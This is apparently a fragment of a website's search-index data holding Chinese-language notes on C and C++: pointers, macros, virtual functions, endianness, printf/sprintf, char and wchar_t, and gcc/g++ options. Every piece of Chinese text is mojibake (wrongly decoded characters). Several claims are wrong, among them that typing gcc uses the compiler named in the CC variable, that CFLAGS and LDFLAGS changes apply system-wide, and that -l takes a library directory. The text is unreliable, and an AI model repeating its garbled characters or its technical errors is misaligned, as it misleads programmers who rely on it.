æ¯”è¾ƒæ‰“è„‘å£³çš„æƒ…å†µ: char *s ; s = \"China\"; // å¯ä»¥ç¼–è¯‘é€šè¿‡, å› ä¸ºè¿™é‡Œèµ‹å€¼å®é™…è¿˜æ˜¯èµ‹å€¼çš„é¦–åœ°å€ // \"China\" æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², è‹¥ç”¨å˜é‡è¡¨ç¤ºæŒ‡å‘å³ä¸ºå…¶é¦–åœ°å€, è¿™é‡ŒæŠŠé¦–åœ°å€èµ‹å€¼ç»™s (æ‰“å°å‡ºæ¥ä¹Ÿæ˜¯é¦–åœ°å€è€Œé\"China\") å‡ ä¸ªä¸åŒæ¦‚å¿µ char *a : ä¿å­˜å­—ç¬¦ä¸²é¦–åœ°å€çš„æŒ‡é’ˆå˜é‡ char a[] : å­—ç¬¦æ•°ç»„ char *a [] : []çš„ä¼˜å…ˆçº§é«˜äº*, æ‰€ä»¥aå…ˆå’Œ []ç»“åˆ, ä»–è¿˜æ˜¯ä¸€ä¸ªæ•°ç»„, æ•°ç»„ä¸­çš„å…ƒç´ æ‰æ˜¯char * char **a : äºŒçº§æŒ‡é’ˆ, è¡¨ç¤ºä¸€çº§æŒ‡é’ˆ çš„åœ°å€ æ³¨è§£ char* a ç­‰ä»·ä¸ char *a, éƒ½æ˜¯è¡¨ç¤ºæŒ‡é’ˆ ä¸è¿‡å¦‚æœä¸€èµ·å®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆåªèƒ½è¿™æ ·å†™: char *a, *b ç‰¹æ®Šç¬¦å· # åœ¨C(++)ä¸­, #è¡¨ç¤ºé¢„å¤„ç†æˆ–è€…é¢„ç¼–è¯‘(æ­£å¼ç¼–è¯‘å‰çš„å¤„ç†, éç¼–è¯‘). æ³¨è§£ Cè¯­è¨€ç¨‹åºä»ç¼–å†™åˆ°è¿è¡Œè¦ç»è¿‡é¢„å¤„ç†ã€ç¼–è¯‘ã€æ±‡ç¼–å’Œé“¾æ¥è¿™ 4 ä¸ªé˜¶æ®µ #define(å®å®šä¹‰) å®šä¹‰æ™®é€šå¸¸é‡ å®šä¹‰ä¸€ä¸ªæ ‡è¯†ç¬¦æ¥è¡¨ç¤ºä¸€ä¸ªå¸¸é‡ã€‚å…¶ç‰¹ç‚¹æ˜¯ï¼šå®šä¹‰çš„æ ‡è¯†ç¬¦ä¸å å†…å­˜ï¼Œåªæ˜¯ä¸€ä¸ªä¸´æ—¶çš„ç¬¦å·ï¼Œé¢„ç¼–è¯‘åè¿™ä¸ªç¬¦å·å°±ä¸å­˜åœ¨äº†ã€‚ ç”¨ #define å®šä¹‰æ ‡è¯†ç¬¦çš„ä¸€èˆ¬å½¢å¼ä¸º: #define æ ‡è¯†ç¬¦ å¸¸é‡ //æ³¨æ„, æœ€åæ²¡æœ‰åˆ†å· ä½œç”¨èŒƒå›´ä¸ºå½“å‰æºæ–‡ä»¶, è‹¥è¦ç»ˆæ­¢ä½¿ç”¨å®å®šä¹‰, ç”¨: #undef æ ‡è¯†ç¬¦ è¡¨ç¤ºä¸å†ä½¿ç”¨å®æ›¿æ¢ æ³¨è§£ å®å®šä¹‰çš„æ ‡è¯†ç¬¦ä¸€èˆ¬å¤§å†™, æœ«å°¾ä¸åŠ åˆ†å·, ä¸”æ”¯æŒå®šä¹‰åµŒå¥— å¸¦å‚æ•°æ›¿æ¢ ä¾‹: #define S(a,b) a*b area=S(3,2); ç¬¬ä¸€æ­¥è¢«æ¢ä¸ºarea=a*b; ç¬¬äºŒæ­¥æ¢ä¸ºarea=3*2; æ³¨è§£ æ³¨æ„å®æ›¿æ¢åªåšæ›¿æ¢, ä¸æ±‚è§£. å®å±•å¼€ä¸å ç”¨è¿è¡Œæ—¶é—´ï¼Œåªå ç”¨ç¼–è¯‘æ—¶é—´ï¼Œå‡½æ•°è°ƒç”¨å è¿è¡Œæ—¶é—´ï¼ˆåˆ†é…å†…å­˜ã€ä¿ç•™ç°åœºã€å€¼ä¼ é€’ã€è¿”å›å€¼ï¼‰ åŒ#è¡¨ç¤ºè¿æ¥ ##æ˜¯è¿æ¥ç¬¦å· ä¾‹: #define Conn(x,y) x##y è¡¨ç¤ºxä¸yè¿æ¥, å¦‚: int n = Conn(123,456); ç»“æœå°±æ˜¯n=123456; è¡¨ç¤ºè½¬æ¢å­—ç¬¦#@ \"#@\"è¡¨ç¤ºè½¬æ¢å­—ç¬¦(ç»“æœåŠ ä¸Šå•å¼•å·), ç»“æœè¿”å›constcharç±»å‹ ä¾‹: #define ToChar(x) #@x å¦‚: char a = ToChar(1); ç»“æœå°±æ˜¯a='1'; åšä¸ªè¶Šç•Œè¯•éªŒ: char a = ToChar(123); ç»“æœæ˜¯a='3'; ä½†æ˜¯å¦‚æœä½ çš„å‚æ•°è¶…è¿‡å››ä¸ªå­—ç¬¦ï¼Œç¼–è¯‘å™¨å°±ç»™ç»™ä½ æŠ¥é”™äº†ï¼error C2015:too many characters in constant ï¼šP è½¬æ¢å­—ç¬¦ä¸²å•# #æ˜¯æ›¿æ¢ä¸ºå­—ç¬¦ä¸² ä¾‹: #define ToString(x) #x è‹¥å®šä¹‰: char* str = ToString(123132); å°±æˆäº†str=\"123132\"; æ³¨è§£ å¯ä»¥ä½¿ç”¨ ifndef æ¥é¿å…é‡å¤å®šä¹‰å®: #ifndef __headerfileXXX__ #define __headerfileXXX__ â€¦ code â€¦ #endif c++è™šå‡½æ•° è¢«virtualå…³é”®å­—ä¿®é¥°çš„æˆå‘˜å‡½æ•°ï¼Œå°±æ˜¯è™šå‡½æ•°. ä½œç”¨æ˜¯ä¸ºäº†å®ç°å¤šæ€(å°†æ¥å£ä¸å®ç°åˆ†ç¦») å€Ÿç”¨ç™¾åº¦ç™¾ç§‘çš„ä¾‹å­: #include<iostream> using namespace std; class A { public: virtual void print(){cout<<\"This is A\"<<endl;} }; class B : public A { public: void print(){cout<<\"This is B\"<<endl;} }; int main1() { A a; B b; a.print(); b.print(); return 0; } int main2() { A a; B b; A *p1 = &a; A *p2 = &b; p1->print(); p2->print(); return 0; } æ­¤ä¾‹ä¸­, å¦‚æœçˆ¶ç±»printä¸æ˜¯å®šä¹‰çš„è™šå‡½æ•°, é‚£ä¹ˆmain2å‡½æ•°æ‰“å°ç»“æœéƒ½æ˜¯ This is A. åªè¦åŸºç±»æ˜¯è™šå‡½æ•°, é‚£ä¹ˆæ´¾ç”Ÿç±»ç»§æ‰¿æ­¤è™šå‡½æ•°çš„, ä¸ç®¡æ˜¯å¦æœ‰å…³é”®å­—virtual, éƒ½æ˜¯è™šå‡½æ•°. å› ä¸ºå¦‚æœæ²¡æœ‰å†™å…³é”®å­—, ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¸®ä½ åŠ ä¸Š. å‚è€ƒ:: https://baike.baidu.com/item /è™šå‡½æ•°#:~:text=åœ¨æŸåŸºç±»ä¸­å£°æ˜ä¸º%20virtual%20å¹¶åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªæ´¾ç”Ÿç±»ä¸­è¢«é‡æ–°å®šä¹‰çš„æˆå‘˜å‡½æ•°ï¼Œç”¨æ³•æ ¼å¼ä¸ºï¼švirtual,å‡½æ•°è¿”å›ç±»å‹%20å‡½æ•°åï¼ˆå‚æ•°è¡¨ï¼‰%20%7Bå‡½æ•°ä½“%7Dï¼›å®ç°å¤šæ€æ€§ï¼Œé€šè¿‡æŒ‡å‘æ´¾ç”Ÿç±»çš„åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œè®¿é—®æ´¾ç”Ÿç±»ä¸­åŒåè¦†ç›–æˆå‘˜å‡½æ•°%E3%80%82 å¦å¤–ä¸€ä¸ªé—®é¢˜, è™šå‡½æ•°çš„ç»§æ‰¿è¦ä¿æŒä¸€è‡´, å¦‚, ä»¥ä¸‹ä¸¤ä¸ªå®šä¹‰æ˜¯ä¸ç­‰ä»·çš„: virtual void func()const virtual void func() è™šå‡½æ•°çš„å£°æ˜ä¸å®šä¹‰è¦æ±‚éå¸¸ä¸¥æ ¼ï¼Œåªæœ‰åœ¨å­å‡½æ•°ä¸­çš„è™šå‡½æ•°ä¸çˆ¶å‡½æ•°ä¸€æ¨¡ä¸€æ ·çš„æ—¶å€™ï¼ˆåŒ…æ‹¬é™å®šç¬¦ï¼‰æ‰ä¼šè¢«è®¤ä¸ºæ˜¯çœŸæ­£çš„è™šå‡½æ•°ï¼Œä¸ç„¶çš„è¯å°±åªèƒ½æ˜¯é‡è½½ã€‚è¿™è¢«ç§°ä¸ºè™šå‡½æ•°å®šä¹‰çš„åŒåè¦†ç›–åŸåˆ™ï¼Œæ„æ€æ˜¯åªæœ‰åç§°å®Œå…¨ä¸€æ ·æ—¶æ‰èƒ½å®Œæˆè™šå‡½æ•°çš„å®šä¹‰ã€‚ å†…å­˜åˆ†åŒº å†…å­˜åˆ†5ä¸ªåŒºï¼šå…¨å±€åå­—ç©ºé—´ï¼Œè‡ªç”±å­˜å‚¨åŒºï¼Œå¯„å­˜å™¨ï¼Œä»£ç ç©ºé—´ï¼Œæ ˆ å¤§ç«¯/å°ç«¯ å¤§ç«¯: è¾ƒä½çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒé«˜çš„å­˜å‚¨å™¨åœ°å€ä¸­ï¼Œè¾ƒé«˜çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒä½çš„å­˜å‚¨å™¨åœ°å€ å°ç«¯: è¾ƒé«˜çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒé«˜çš„å­˜å‚¨å™¨åœ°å€ä¸­ï¼Œè¾ƒä½çš„æœ‰æ•ˆå­—èŠ‚å­˜æ”¾åœ¨è¾ƒä½çš„å­˜å‚¨å™¨åœ°å€ æ ˆçš„åœ°å€åˆ†é…æ˜¯ä»é«˜->ä½,å †çš„åœ°å€åˆ†é…æ˜¯ä»ä½->é«˜.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-Basic-knowledge.html","loc":"/yq-doc-source-docs-rear-end-from-Basic-knowledge.html"},{"title":"C++","text":"æœ€åˆæœ¬æ¥æ˜¯åœ¨ /docs/åç«¯/c/åŸºç¡€çŸ¥è¯† ç­‰é‡Œé¢æ··ç€Cä¸C++è¯´, åé¢æ˜¯è¶Šæ¥è¶Šå¤šäº†, è§‰å¾—è¿˜æ˜¯åˆ†äº†å¥½ç‚¹. æ•°ç»„å½¢å‚ä¸å®å‚çš„è¯´æ˜ åœ¨C++ä¸­,å¦‚æœå½¢å‚ç±»å‹æ˜¯`char a[]`(æˆ–å…¶ä»–æ•°ç»„ç±»å‹),å®ƒä¼šé»˜è®¤ decay(é€€åŒ–) æˆ char*(æˆ–ç›¸åº”çš„æŒ‡é’ˆç±»å‹)ã€‚ æ‰€ä»¥ char a[] å½¢å‚ä¼šè¢«è§†ä¸º char* a. ä¸¾ä¸€ä¸ªä¾‹å­: void print(char a[]) { cout << a << endl; } int main() { char str[] = \"Hello\"; print(str); } è¿™é‡Œ, print å‡½æ•°çš„å½¢å‚æ˜¯ char a[] , ä½†æ˜¯åœ¨è°ƒç”¨ print(str) æ—¶, str æ•°ç»„ä¼šè‡ªåŠ¨é€€åŒ–ä¸ºæŒ‡é’ˆ. æ‰€ä»¥å®é™…ä¸Š a æ˜¯ char* ç±»å‹,å¹¶ä¸”æŒ‡å‘å­—ç¬¦ä¸² \"Hello\" . å‡½æ•°å½¢å‚å®šä¹‰æ˜¯å¦åº”è¯¥ä½¿ç”¨æŒ‡é’ˆ ä¸»è¦å–å†³äºæˆ‘ä»¬æ˜¯å¦éœ€è¦ä¿®æ”¹åŸå˜é‡çš„å€¼å§ å½“éœ€è¦ä¿®æ”¹åŸå˜é‡å€¼æ—¶, å¿…é¡»ä¼ é€’æŒ‡é’ˆ, æ¯”å¦‚ç»“æ„ä½“; ä¸éœ€è¦ä¿®æ”¹å€¼æ—¶, éƒ½å¯ä»¥, ä¸è¿‡ä½¿ç”¨æŒ‡é’ˆæ˜¯å¯¹åŸæ¥å˜é‡çš„å¼•ç”¨å¯ä»¥èŠ‚çœç©ºé—´. å¦åˆ™å°±æ˜¯å˜é‡çš„å¤åˆ¶. char *str[]ä¸char str[]åŒºåˆ« char *str[] æ˜¯ä¸€ç»´å­—ç¬¦æŒ‡é’ˆæ•°ç»„ã€‚å®ƒçš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚ (èµ‹å€¼å­—ç¬¦ä¸²) char str[] æ˜¯ä¸€ç»´å­—ç¬¦æ•°ç»„ã€‚å®ƒçš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ã€‚(èµ‹å€¼å­—ç¬¦) å°†å­—ç¬¦æŒ‡é’ˆ(å­—ç¬¦ä¸²)èµ‹å€¼ç»™äº†æ•°ç»„å…ƒç´ ã€‚æ¯ä¸ªæ•°ç»„å…ƒç´ éƒ½æŒ‡å‘ä¸€ä¸ªå­—ç¬¦ä¸²: char *str[] = { \"Hello\", \"World\", \"!\" }; cout << str[0] << ' ' << str[1] << endl; // Hello World å°†å­—ç¬¦(å­—ç¬¦å€¼)èµ‹å€¼ç»™äº†æ•°ç»„å…ƒç´ ã€‚æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦: char str[] = { 'H', 'e', 'l', 'l', 'o' }; cout << str << endl; // Hello","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-C-++.html","loc":"/yq-doc-source-docs-rear-end-from-C-++.html"},{"title":"printfä¸sprintf","text":"sprintfå’Œprintfåœ¨ç”¨æ³•å’ŒåŠŸèƒ½ä¸Šå­˜åœ¨ä»¥ä¸‹åŒºåˆ« printf(data): å°†å†…å®¹è¾“å‡ºåˆ°å±å¹• sprintf(var, data): å°†dataèµ‹å€¼ç»™var, dataå¯ä»¥æ˜¯ä¸åŒç±»å‹å˜é‡çš„æ ¼å¼åŒ–; è¿™å°±æ˜¯ä¸ strcpy çš„å·®åˆ«, strcpy åªèƒ½æ“ä½œå­—ç¬¦ä¸² strcpy(var1, var2): Cstring_strcpy","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-C-library-function-Printf-and-Sprintf.html","loc":"/yq-doc-source-docs-rear-end-from-C-library-function-Printf-and-Sprintf.html"},{"title":"fflush","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-C-library-function-fflush.html","loc":"/yq-doc-source-docs-rear-end-from-C-library-function-fflush.html"},{"title":"cç±»å‹","text":"char å’Œ wchar_t æ˜¯ C è¯­è¨€ä¸­çš„å­—ç¬¦ç±»å‹ã€‚ char åŸºæœ¬çš„å­—ç¬¦ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªå­—èŠ‚å¤§å°çš„å­—ç¬¦ã€‚ å®ƒå¯ä»¥å­˜å‚¨ ASCII å­—ç¬¦é›†ä¸­çš„å­—ç¬¦ï¼Œä»¥åŠæ‰©å±•å­—ç¬¦é›†ï¼ˆå¦‚ Latin-1ï¼‰ä¸­çš„å­—ç¬¦ã€‚ wchar_t å®½å­—ç¬¦ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚çš„å®½å­—ç¬¦ã€‚ å®ƒçš„å¤§å°å¯ä»¥æ ¹æ®ç¼–è¯‘å™¨å’Œå¹³å°çš„ä¸åŒè€Œå˜åŒ–ï¼Œé€šå¸¸æ˜¯ 2 ä¸ªæˆ– 4 ä¸ªå­—èŠ‚å¤§å°ã€‚ wchar_t ç±»å‹ç”¨äºæ”¯æŒæ›´å¹¿æ³›çš„å­—ç¬¦é›†ï¼ŒåŒ…æ‹¬ Unicode å­—ç¬¦é›†ã€‚ charä¸wchar_t char ä¸ wchar_t åœ¨ C è¯­è¨€ä¸­ï¼Œä½¿ç”¨ char ç±»å‹å¯ä»¥å¤„ç†å¤§å¤šæ•°å¸¸è§çš„å­—ç¬¦å’Œå­—ç¬¦ä¸²æ“ä½œã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ char ç±»å‹çš„æ•°ç»„å¯ä»¥å­˜å‚¨å’Œæ“ä½œæ™®é€šçš„å­—ç¬¦ä¸²ã€‚ è€Œåœ¨éœ€è¦å¤„ç†å®½å­—ç¬¦é›†çš„åœºæ™¯ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ wchar_t ç±»å‹å’Œç›¸å…³çš„å®½å­—ç¬¦å‡½æ•°ï¼Œå¦‚ wprintfã€wcscpy ç­‰ã€‚ è¿™äº›å®½å­—ç¬¦å‡½æ•°å¯ä»¥å¤„ç†å¤šå­—èŠ‚å­—ç¬¦ï¼Œæä¾›å¯¹ Unicode å­—ç¬¦é›†çš„æ”¯æŒã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œchar å’Œ wchar_t ä¹‹é—´çš„è½¬æ¢éœ€è¦ä½¿ç”¨ç›¸åº”çš„è½¬æ¢å‡½æ•°ï¼Œä¾‹å¦‚ mbstowcs å’Œ wcstombsã€‚ åœ¨ Python ä¸­ï¼Œå¯¹äºå¤„ç†å­—ç¬¦å’Œå­—ç¬¦ä¸²ï¼Œé€šå¸¸ä½¿ç”¨ Unicode å­—ç¬¦ä¸²ï¼Œå› ä¸º Python 3 é»˜è®¤ä½¿ç”¨ Unicode å­—ç¬¦ä¸²ã€‚ åœ¨ ctypes ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ c_char å’Œ c_wchar ç±»å‹æ¥ä¸ C çš„ char å’Œ wchar_t è¿›è¡Œäº¤äº’ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-C-type.html","loc":"/yq-doc-source-docs-rear-end-from-C-type.html"},{"title":"gcc/g++","text":"æœ€æµ…æ˜¾æ˜¯è®¤è¯†æ˜¯: gcc ç”¨äº c è¯­è¨€ g++ ç”¨äº c++ ä½†æ˜¯è¿™ä¸ªè®¤è¯†æ˜¯é”™çš„, ä¹Ÿä¸è¯´å…¨é”™, æ­£ç¡®çš„è®¤è¯†æ˜¯: g++ä»¥åŠgccçš„åŒºåˆ« å¤§è‡´: GCC:GNU Compiler Collection(GUN ç¼–è¯‘å™¨é›†åˆ)ï¼Œå®ƒå¯ä»¥ç¼–è¯‘Cã€C++ã€JAVã€Fortranã€Pascalã€Object-Cç­‰è¯­è¨€ã€‚ Compiler ç¼–è¯‘ç¨‹åºï¼Œgcc/g++/cc ç”¨æ¥ç¼–è¯‘æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸é€šè¿‡ gcc è°ƒç”¨ g++ æˆ– cc å‘½ä»¤ï¼› Assemblers æ±‡ç¼–ç¨‹åºï¼Œç¼–è¯‘æ±‡ç¼–ç¨‹åºï¼Œé€šå¸¸é€šè¿‡ gcc è°ƒç”¨ as å‘½ä»¤ï¼› Linkers é“¾æ¥ç¨‹åºï¼Œç”¨æ¥é“¾æ¥ç¼–è¯‘è¾“å‡ºçš„ç›®æ ‡æ–‡ä»¶ï¼Œç”Ÿæˆå¯æ‰§è¡Œç¨‹åºï¼Œé€šå¸¸é€šè¿‡ gcc è°ƒç”¨ ld å‘½ä»¤ï¼Œè¿˜æœ‰ ar å‘½ä»¤ç”Ÿæˆé“¾æ¥åº“ï¼› GCC ç¼–è¯‘å¥—ä»¶ä¸ä»…æ”¯æŒ C/C++ï¼Œæ”¯æŒå„ç§ C/C++ æ–¹è¨€æ ‡å‡†ï¼Œè¿˜æ”¯æŒ Go æˆ– Object-C/C++ ç­‰ï¼Œå¹¶ä¸”æ”¯æŒ x86ã€x86_64ã€ARM ç­‰å¤šç§ CPU æ¶æ„ã€‚æä¾› gcc å‘½ä»¤ç›¸å½“äºä¸€ä¸ªé—¨æˆ·ï¼Œå®ƒæœ¬èº«å°±æ˜¯ C è¯­è¨€ç¼–è¯‘å™¨ï¼Œå¹¶ä¸”é€šè¿‡å®ƒå¯ä»¥è°ƒç”¨æ•´ä¸ªç¼–è¯‘æµç¨‹ä¸­ä¼šä½¿ç”¨åˆ°çš„å„ç§å‘½ä»¤ã€‚å®ƒå¯ä»¥è¯†åˆ«å„ç§ C/C++ æºæ–‡ä»¶çš„æ‰©å±•åï¼Œå¹¶å°†ç›¸åº”å‚æ•°ä¼ ç»™ç›¸åº”çš„å‘½ä»¤ï¼Œå¦‚æœæ˜¯ C++ æºä»£ç ï¼Œåˆ™æ‰§è¡Œ g++ å‘½ä»¤ã€‚ å¦å¤–ï¼Œ cc æ˜¯ Unix ç³»ç»Ÿçš„ C Compilerï¼Œä¸€ä¸ªæ˜¯å¤è€çš„ C ç¼–è¯‘å™¨å‘½ä»¤ã€‚Linux çš„ cc ä¸€èˆ¬æ˜¯ä¸€ä¸ªç¬¦å·è¿æ¥ï¼ŒæŒ‡å‘ gccï¼Œå¯ä»¥é€šè¿‡ ls -l /usr/bin/cc æ¥æŸ¥çœ‹ã€‚ æ³¨æ„ï¼Œç›´æ¥ä½¿ç”¨ g++ ç¼–è¯‘ C è¯­è¨€æºä»£ç ä¼šè¢«å½“ä½œ C++ æºä»£ç å¤„ç†ã€‚ ä¾‹å¦‚ï¼Œç¼–è¯‘ C è¯­è¨€ä¸ºæ±‡ç¼–ç¨‹åºï¼Œä¸ç”Ÿæˆç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œç¨‹åºï¼Œåªéœ€è¦æ‰§è¡Œå‘½ä»¤æ—¶ä½¿ç”¨ -S ï¼š gccæ˜¯GCCä¸­çš„GUN C Compilerï¼ˆC ç¼–è¯‘å™¨ï¼‰ g++æ˜¯GCCä¸­çš„GUN C++ Compilerï¼ˆC++ç¼–è¯‘å™¨ï¼‰ gccå’Œg++çš„ä¸»è¦åŒºåˆ«: å¯¹äº .cå’Œ .cppæ–‡ä»¶ï¼Œgccåˆ†åˆ«å½“åšcå’Œcppæ–‡ä»¶ç¼–è¯‘ï¼ˆcå’Œcppçš„è¯­æ³•å¼ºåº¦æ˜¯ä¸ä¸€æ ·çš„ï¼‰ å¯¹äº .cå’Œ .cppæ–‡ä»¶ï¼Œg++åˆ™ç»Ÿä¸€å½“åšcppæ–‡ä»¶ç¼–è¯‘ ä½¿ç”¨g++ç¼–è¯‘æ–‡ä»¶æ—¶ï¼Œg++ä¼šè‡ªåŠ¨é“¾æ¥æ ‡å‡†åº“STLï¼Œè€Œgccä¸ä¼šè‡ªåŠ¨é“¾æ¥STL gccåœ¨ç¼–è¯‘Cæ–‡ä»¶æ—¶ï¼Œå¯ä½¿ç”¨çš„é¢„å®šä¹‰å®æ˜¯æ¯”è¾ƒå°‘çš„ gccåœ¨ç¼–è¯‘cppæ–‡ä»¶æ—¶/g++åœ¨ç¼–è¯‘cæ–‡ä»¶å’Œcppæ–‡ä»¶æ—¶ï¼ˆè¿™æ—¶å€™gccå’Œg++è°ƒç”¨çš„éƒ½æ˜¯cppæ–‡ä»¶çš„ç¼–è¯‘å™¨ï¼‰ï¼Œä¼šåŠ å…¥ä¸€äº›é¢å¤–çš„å®ã€‚ åœ¨ç”¨gccç¼–è¯‘c++æ–‡ä»¶æ—¶ï¼Œä¸ºäº†èƒ½å¤Ÿä½¿ç”¨STLï¼Œéœ€è¦åŠ å‚æ•° â€“lstdc++ ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ gcc â€“lstdc++ å’Œ g++ç­‰ä»·ï¼Œå®ƒä»¬çš„åŒºåˆ«ä¸ä»…ä»…æ˜¯è¿™ä¸ªã€‚ gcc é€‰é¡¹ -I <dir> æŒ‡å®šå¤´æ–‡ä»¶æ‰€åœ¨ç›®å½•, ä¼šä¼˜å…ˆæ‰¾æ­¤å¤„æŒ‡å®šçš„ç›®å½• -l <dir> æŒ‡å®šåº“è·¯å¾„. æŒ‡å®šéœ€è¦é“¾æ¥çš„åº“åï¼Œç”¨äºå‘Šè¯‰é“¾æ¥å™¨éœ€è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ -L <dir> æŒ‡å®šåº“æ–‡ä»¶æ‰€åœ¨ç›®å½• -f no-lto ç¦ç”¨é“¾æ¥æ—¶ä¼˜åŒ–ï¼ˆLTOï¼‰ å½“ä½¿ç”¨è¯¥é€‰é¡¹ç¼–è¯‘æºä»£ç æ—¶ï¼Œç¼–è¯‘å™¨å°†ä¸ä¼šè¿›è¡Œé“¾æ¥æ—¶ä¼˜åŒ–ï¼Œ è¿™å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ€§èƒ½ä¸Šçš„æŸå¤±ï¼Œä½†ä¹Ÿå¯ä»¥é¿å…æŸäº›é“¾æ¥é”™è¯¯ã€‚ æ³¨è§£ -fno-lto ä¸»è¦ç”¨äºä½¿ç”¨çš„é“¾æ¥æ–‡ä»¶æ˜¯ç”±å…¶ä»–ç‰ˆæœ¬LTOçš„gccç¼–è¯‘æ—¶å¯¼è‡´æ— æ³•ç»§ç»­ç¼–è¯‘æ—¶å€™å§ ç½‘ä¸Šçœ‹åˆ°ä¸€ç¯‡ä¸é”™çš„è¯´æ˜: gccå‘½ä»¤è¡Œè¯¦è§£ gcc ç›¸å…³ç¯å¢ƒå˜é‡ CC CC åœ¨Linuxç³»ç»Ÿä¸­ï¼ŒCCæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºæŒ‡å®šé»˜è®¤çš„Cç¼–è¯‘å™¨ã€‚ å½“ä½ åœ¨ç»ˆç«¯ä¸­è¾“å…¥gccå‘½ä»¤æ—¶ï¼Œå®é™…ä¸Šæ˜¯ä½¿ç”¨äº†CCç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„ç¼–è¯‘å™¨ã€‚ CCç¯å¢ƒå˜é‡é€šå¸¸è¢«è®¾ç½®ä¸ºgccæˆ–clangç­‰ç¼–è¯‘å™¨çš„è·¯å¾„ï¼Œä¾‹å¦‚ï¼š CC=/usr/bin/gcc è¿™è¡¨ç¤ºé»˜è®¤ä½¿ç”¨GCCä½œä¸ºCç¼–è¯‘å™¨ã€‚å¦‚æœä½ æƒ³ä½¿ç”¨Clangä½œä¸ºCç¼–è¯‘å™¨ï¼Œåˆ™å¯ä»¥å°†CCç¯å¢ƒå˜é‡çš„å€¼è®¾ç½®ä¸ºClangçš„è·¯å¾„ã€‚ æ³¨è§£ ä¿®æ”¹CCç¯å¢ƒå˜é‡å¯èƒ½ä¼šå½±å“æ•´ä¸ªç³»ç»Ÿçš„è¡Œä¸ºã€‚å› æ­¤ï¼Œåœ¨æ›´æ”¹å®ƒä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œå¹¶ä¸”è¿›è¡Œå……åˆ†çš„æµ‹è¯•å’Œç¡®è®¤ã€‚ å¦‚æœä½ æƒ³ä¿®æ”¹GCCè¿è¡Œæ—¶é»˜è®¤æ·»åŠ çš„å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ç¯å¢ƒå˜é‡ CFLAGS å’Œ LDFLAGS CFLAGS CFLAGSç¯å¢ƒå˜é‡ç”¨äº æŒ‡å®šç¼–è¯‘å™¨ï¼ˆä¾‹å¦‚gccï¼‰çš„é»˜è®¤ç¼–è¯‘é€‰é¡¹ . å®ƒé€šå¸¸åŒ…å«ä¸€ç³»åˆ—çš„æ ‡å¿—ï¼Œä¾‹å¦‚ä¼˜åŒ–çº§åˆ«ã€è°ƒè¯•ä¿¡æ¯ç­‰ç­‰ã€‚ å¦‚æœä½ æƒ³æ·»åŠ æˆ–ä¿®æ”¹é»˜è®¤çš„ç¼–è¯‘é€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®CFLAGSç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚: CFLAGS=\"-O3 -Wall\" è¿™é‡Œå°†ä¼˜åŒ–çº§åˆ«è®¾ç½®ä¸º-O3ï¼Œå¹¶å¯ç”¨æ‰€æœ‰è­¦å‘Šä¿¡æ¯ï¼ˆ-Wallï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯, ä¿®æ”¹CFLAGSç¯å¢ƒå˜é‡ä¼šå¯¹æ•´ä¸ªç³»ç»Ÿç”Ÿæ•ˆ LDFLAGS LDFLAGSç¯å¢ƒå˜é‡ç”¨äº æŒ‡å®šé“¾æ¥å™¨ï¼ˆä¾‹å¦‚ldï¼‰çš„é»˜è®¤é“¾æ¥é€‰é¡¹ . å®ƒé€šå¸¸åŒ…å«ä¸€ç³»åˆ—çš„æ ‡å¿—ï¼Œä¾‹å¦‚åº“æ–‡ä»¶è·¯å¾„ã€é™æ€é“¾æ¥é€‰é¡¹ã€åŠ¨æ€é“¾æ¥é€‰é¡¹ç­‰ç­‰ã€‚ å¦‚æœä½ æƒ³æ·»åŠ æˆ–ä¿®æ”¹é»˜è®¤çš„é“¾æ¥é€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®LDFLAGSç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚: LDFLAGS=\"-L/path/to/library/files -lmymath\" è¿™é‡Œå°†åº“æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸º/path/to/library/filesï¼Œå¹¶é“¾æ¥ä¸€ä¸ªåä¸ºlibmymath.soçš„å…±äº«åº“æ–‡ä»¶ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¿®æ”¹LDFLAGSç¯å¢ƒå˜é‡ä¼šå¯¹æ•´ä¸ªç³»ç»Ÿç”Ÿæ•ˆã€‚ 